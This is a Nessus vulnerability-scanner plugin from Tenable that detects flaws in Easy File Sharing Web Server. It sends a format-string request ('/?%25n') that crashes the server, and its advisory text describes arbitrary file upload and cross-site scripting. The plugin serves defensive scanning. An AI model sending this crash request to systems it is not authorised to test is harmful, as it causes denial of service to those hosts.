#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(21039);
  script_version("$Revision: 1.20 $");

  script_cve_id("CVE-2006-1159", "CVE-2006-1160", "CVE-2006-1161");
  script_bugtraq_id(17046);
  script_osvdb_id(23791, 23792, 23793);

  script_name(english:"Easy File Sharing Web Server Multiple Remote Vulnerabilities (FS, XSS, Upload)");
  script_summary(english:"Sends a format string to EFS web server");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server suffers from a format string vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Easy File Sharing Web Server, a file
sharing application / web server for Windows. 

The version of Easy File Sharing Web Server installed on the remote
host may crash if it receives requests with an option parameter
consisting of a format string.  It is unknown whether this issue can
be exploited to execute arbitrary code on the remote host, although it
is likely the case. 

In addition, the application reportedly allows remote users to upload
arbitrary files to arbitrary locations on the affected host.  An
attacker may be able to leverage this issue to completely compromise
the host by placing them in the startup folder and waiting for a
reboot. 

Additionally, it fails to sanitize input to the 'Description' field
when creating a folder or uploading a file, which could lead to
cross-site scripting attacks. 

Note that by default the application runs with the privileges of the
user who started it, although it can be configured to run as a
service." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/427158/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2006/03/10");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/03/09");

 script_cvs_date("$Date: 2016/05/05 16:01:13 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_DENIAL);
  script_family(english:"Web Servers");
  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("Settings/ThoroughTests");

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if ( ! thorough_tests )
 exit(0, "This plugin is slow and only run if the 'Perform thorough tests' setting is enabled.");

port = get_http_port(default:80);

# Make sure the banner indicates it's EFS.
banner = get_http_banner(port:port);
if (!banner || "Server: Easy File Sharing Web Server" >!< banner)
 exit(0, "The web server on port "+port+" is not Easy Fil Sharing.");


# Try to crash it.
r = http_send_recv3(method:"GET", item:"/?%25n", port:port, exit_on_fail: 0);


# If we didn't get anything back...
if (isnull(r))
{
  # The server doesn't crash right away so try for a bit to open a connection.
  tries = 5;
  for (iter=0; iter<=tries; iter++) {
    soc = http_open_socket(port);
    if (soc) {
      failed = 0;
      close(soc);
      sleep(5);
    }
    else {
      failed++;
      if (failed > 1) {
        security_hole(port);
	set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
        exit(0);
      }
    }
  }
}
